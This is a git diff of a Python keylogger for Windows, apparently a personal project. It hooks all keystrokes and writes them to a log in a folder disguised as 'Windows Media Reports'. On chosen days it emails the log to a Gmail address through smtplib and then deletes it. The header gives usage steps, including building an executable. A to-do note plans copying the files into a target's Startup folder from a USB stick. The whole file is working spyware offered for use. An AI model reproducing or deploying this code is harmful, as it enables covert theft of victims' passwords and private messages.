@@ -1,83 +1,93 @@
+#######################"""How to use"""###############################
+# Edit line 39,40,41 to send the email to yourself - has to be gmail #
+# convert the file into an executable                                #
+# install the require libraries                                      #
+####################################3#################################
+
+
 """
 								Note
-- C:\\Users\\Henry\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
+- C:\\Users\\userName\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
 
 								To Do
-- Create a bash or python script that moves the files from usb to startup folder
-- Send file to dump email
-- Delete the old files that pass 7 days 
-- Send before you delete 
-- engulf the email section in an if statement so it doesn't run everyday
+- Create a bash or python script that moves the files from usb to startup folder of target
 
 								Bugs 
 - All letters are caplitlized
-- Numbers are mixed in where characters should be
+- Numbers are printed because we ignored non-english characters
 
 """
 # windows handling 
 import pyHook, pythoncom, os
-
 # get user's name
 import getpass
-
 # email handling
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+from datetime import datetime # get current date
+from pathlib import Path # get user's name so we can go to the directory
 
-# get current date
-from datetime import datetime
-# get user's name so we can go to the directory
-from pathlib import Path
+# current day
+todays_number = datetime.today().day # returns which day it is in the month
+todays_date = datetime.now().strftime('%Y-%b-%d') # returns Year-Month-Day string format
+whenToSend = [1,7,14,28] # an array for days of the month to know whne to send :: editable
+
+# Email credentials for Google to specify where you send from and to :: editable
+emailUser = 'your@gmail.com'
+emailSend = 'your@gmail.com'
+password = 'YourPassword'
+subject = getpass.getuser() + " " + todays_date # used for subject of email format :: editable
 
 # get's the current user's home directory 
+# returns C:\Users\NameOfUser
 home = str(Path.home())
 
-# where to create new folder 
+# where to create new folder :: editable
 newFolderDir = home + '\\Documents\\Windows Media Reports\\' 
+fileName = "MediaReport.txt"
+fileDirectory = home + '\\Documents\\Windows Media Reports\\' + fileName
 
-todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = home + '\\Documents\\Windows Media Reports\\' + todays_date + '.txt'
 
-# dump email information
-emailUser = 'something@gmail.com'
-emailSend = 'something@gmail.com'
-subject = getpass.getuser() + " " + todays_date
+# Email function
+###########################################################################
+def send_email(date):
+	if(date in whenToSend):
+		if(os.path.isfile(fileDirectory)):
+			# Message setup
+			msg = MIMEMultipart()
+			msg['From'] = emailUser
+			msg['To'] = emailSend
+			msg['Subject'] = subject
 
-msg = MIMEMultipart()
-msg['From'] = emailUser
-msg['To'] = emailSend
-msg['Subject'] = subject
+			body = 'Another one'
+			msg.attach(MIMEText(body,'plain'))
 
-body = 'Another one'
-msg.attach(MIMEText(body,'plain'))
+			# Here we are sending multiple files 
+			# ** look at all files in the directory, attach them, send, and delete
 
-"""
-Here we are sending multiple files 
-** look at all files in the directory, attach them, send, and delete
+			attachment = open(fileDirectory, 'rb')
 
-attachment = open('filename.txt', 'rb')
-"""
+			part = MIMEBase('application', 'octet-stream')
+			part.set_payload((attachment).read())
+			encoders.encode_base64(part)
+			part.add_header('Content-Disposition', "attachment; filename= " + fileDirectory)
 
-part = MIMEBase('application', 'octet-stream')
-part.set_payload((attachment).read())
-encoders.encode_base64(part)
-part.add_header('Content-Disposition', "attachment; filename= " + file_name)
+			msg.attach(part)
+			text = msg.as_string()
+			server = smtplib.SMTP('smtp.gmail.com', 587)
+			server.starttls()
+			server.login(emailUser, password)
 
-msg.attach(part)
-text = msg.as_string()
-server = smtplib.SMTP('smtp.gmail.com', 587)
-server.starttls()
-server.login(emailUser, "pw")
-
-server.sendmail(emailUser,emailSend,text)
-server.quit()
-
+			server.sendmail(emailUser,emailSend,text)
+			server.quit()
+			attachment.close()
+			# now you need to delete the files after this line
+			os.remove(fileDirectory)
 
 ###########################################################################
-
 
 # Beginning of the Key Logger
 
@@ -85,15 +95,14 @@ line_buffer = "" #current typed line before return character
 window_name = "" #current window
 
 # C:\Users\NameOfUser\Document\Windows Media Reports\
-
-# create the folder for where the 
+# create the folder for where the log docs will go 
 def create_Directory():
     if not os.path.exists(newFolderDir):
         os.makedirs(newFolderDir)
 
 # save the buffer to the file
 def SaveLineToFile(line):
-    todays_file = open(file_name, 'a') #open todays file (append mode)
+    todays_file = open(fileDirectory, 'a') #open todays file (append mode)
     todays_file.write(line) #append line to file
     todays_file.close() #close todays file
 
@@ -140,11 +149,12 @@ def OnKeyboardEvent(event):
         line_buffer += chr(event.KeyID) #add pressed character to line buffer
         
     return True #pass event to other handlers
-
-print(subject)
+###########################################################################
 
 #creates the directory 
+send_email(todays_number)
 create_Directory()
+
 
 hooks_manager = pyHook.HookManager() #create hook manager
 hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
